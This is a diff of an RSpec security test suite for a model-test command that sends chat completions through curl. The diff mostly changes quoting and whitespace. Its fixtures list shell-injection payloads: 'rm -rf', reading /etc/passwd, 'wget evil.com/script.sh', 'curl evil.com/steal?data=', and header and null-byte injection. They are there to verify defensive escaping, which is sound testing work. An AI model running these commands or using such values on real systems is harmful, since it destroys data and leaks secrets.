@@ -23,7 +23,7 @@ RSpec.describe 'Model Test Command Security Fix' do
 
       # Extract the fixed test_chat_completion method directly to test it
       def test_chat_completion(_name, model_name, pod, timeout)
-        # Simulate the ProgressFormatter.with_spinner behavior  
+        # Simulate the ProgressFormatter.with_spinner behavior
         pod_name = pod.dig('metadata', 'name')
 
         # Build the JSON payload
@@ -42,7 +42,7 @@ RSpec.describe 'Model Test Command Security Fix' do
 
           # Build secure curl command using temp file
           # This eliminates shell injection vulnerability
-          curl_command = "curl -s -X POST http://localhost:4000/v1/chat/completions " \
+          curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                          "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"
 
           # Execute the curl command inside the pod
@@ -86,7 +86,7 @@ RSpec.describe 'Model Test Command Security Fix' do
         test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, timeout)
 
         expect(test_instance.execute_in_pod_calls.length).to eq(1)
-        
+
         captured_command = test_instance.execute_in_pod_calls.first[:command]
         expect(captured_command).to include('curl -s -X POST http://localhost:4000/v1/chat/completions')
         expect(captured_command).to include('-H \'Content-Type: application/json\'')
@@ -99,7 +99,7 @@ RSpec.describe 'Model Test Command Security Fix' do
       it 'cleans up temporary files' do
         # Track temp file creation
         temp_files_created = []
-        allow(Tempfile).to receive(:new) do |args|
+        allow(Tempfile).to receive(:new) do |_args|
           file = double('tempfile')
           allow(file).to receive(:write)
           allow(file).to receive(:close)
@@ -120,12 +120,12 @@ RSpec.describe 'Model Test Command Security Fix' do
     context 'with potentially malicious model names' do
       let(:malicious_payloads) do
         [
-          "'; rm -rf /tmp/* ; echo '",     # Command injection attempt
-          "test'; cat /etc/passwd #",     # File disclosure attempt
-          "model\"; wget evil.com/script.sh; #", # Download attempt
+          "'; rm -rf /tmp/* ; echo '", # Command injection attempt
+          "test'; cat /etc/passwd #", # File disclosure attempt
+          'model"; wget evil.com/script.sh; #', # Download attempt
           "normal' && curl evil.com/steal?data=", # Data exfiltration
           "test'`id`'",                   # Command substitution
-          "model$(whoami)",               # Command substitution
+          'model$(whoami)',               # Command substitution
           "test\nrm -rf /",               # Newline injection
           "test\r\nHost: evil.com",       # HTTP header injection
           "test\x00/bin/sh",              # Null byte injection
@@ -145,7 +145,7 @@ RSpec.describe 'Model Test Command Security Fix' do
 
           # Verify the malicious content is safely contained in JSON and temp file
           expect(captured_command).not_to include(malicious_name)
-          expect(captured_command).to match(/curl -s -X POST.*-d @\/\S+.*--max-time \d+/)
+          expect(captured_command).to match(%r{curl -s -X POST.*-d @/\S+.*--max-time \d+})
 
           # Verify no dangerous shell patterns are present in the command
           expect(captured_command).not_to include('echo')
@@ -163,8 +163,8 @@ RSpec.describe 'Model Test Command Security Fix' do
 
       it 'properly escapes timeout parameter' do
         # Test with string timeout that could be dangerous
-        dangerous_timeout = "30; rm -rf /"
-        
+        dangerous_timeout = '30; rm -rf /'
+
         test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, dangerous_timeout)
 
         captured_command = test_instance.execute_in_pod_calls.first[:command]
@@ -204,7 +204,7 @@ RSpec.describe 'Model Test Command Security Fix' do
       it 'cleans up temp file even when execute_in_pod fails' do
         # Create a test instance with execute_in_pod that raises an error
         error_test_instance = Class.new do
-          def execute_in_pod(pod_name, command)
+          def execute_in_pod(_pod_name, _command)
             raise StandardError, 'Pod execution failed'
           end
 
@@ -223,7 +223,7 @@ RSpec.describe 'Model Test Command Security Fix' do
               temp_file.write(payload)
               temp_file.close
 
-              curl_command = "curl -s -X POST http://localhost:4000/v1/chat/completions " \
+              curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                              "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"
 
               result = execute_in_pod(pod_name, curl_command)
@@ -231,8 +231,7 @@ RSpec.describe 'Model Test Command Security Fix' do
               temp_file&.unlink
             end
 
-            response = JSON.parse(result)
-            response
+            JSON.parse(result)
           rescue JSON::ParserError => e
             raise "Failed to parse response: #{e.message}"
           end
@@ -256,7 +255,7 @@ RSpec.describe 'Model Test Command Security Fix' do
       it 'cleans up temp file when JSON parsing fails' do
         # Create a test instance that returns invalid JSON
         json_error_test_instance = Class.new do
-          def execute_in_pod(pod_name, command)
+          def execute_in_pod(_pod_name, _command)
             'invalid json'
           end
 
@@ -275,7 +274,7 @@ RSpec.describe 'Model Test Command Security Fix' do
               temp_file.write(payload)
               temp_file.close
 
-              curl_command = "curl -s -X POST http://localhost:4000/v1/chat/completions " \
+              curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                              "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"
 
               result = execute_in_pod(pod_name, curl_command)
@@ -283,8 +282,7 @@ RSpec.describe 'Model Test Command Security Fix' do
               temp_file&.unlink
             end
 
-            response = JSON.parse(result)
-            response
+            JSON.parse(result)
           rescue JSON::ParserError => e
             raise "Failed to parse response: #{e.message}"
           end
@@ -311,16 +309,16 @@ RSpec.describe 'Model Test Command Security Fix' do
     it 'demonstrates that malicious content stays in temp file, not command' do
       # Test that even with the most dangerous model name, the command itself is safe
       malicious_model_name = "'; rm -rf /; echo '"
-      
+
       test_instance.send(:test_chat_completion, 'test-name', malicious_model_name, mock_pod, 30)
-      
+
       captured_command = test_instance.execute_in_pod_calls.first[:command]
-      
+
       # The command should follow the secure pattern with temp file
       expect(captured_command).to match(
         %r{curl -s -X POST http://localhost:4000/v1/chat/completions -H 'Content-Type: application/json' -d @/\S+ --max-time 30}
       )
-      
+
       # Verify the malicious content is nowhere in the command
       expect(captured_command).not_to include(malicious_model_name)
       expect(captured_command).not_to include('rm -rf')
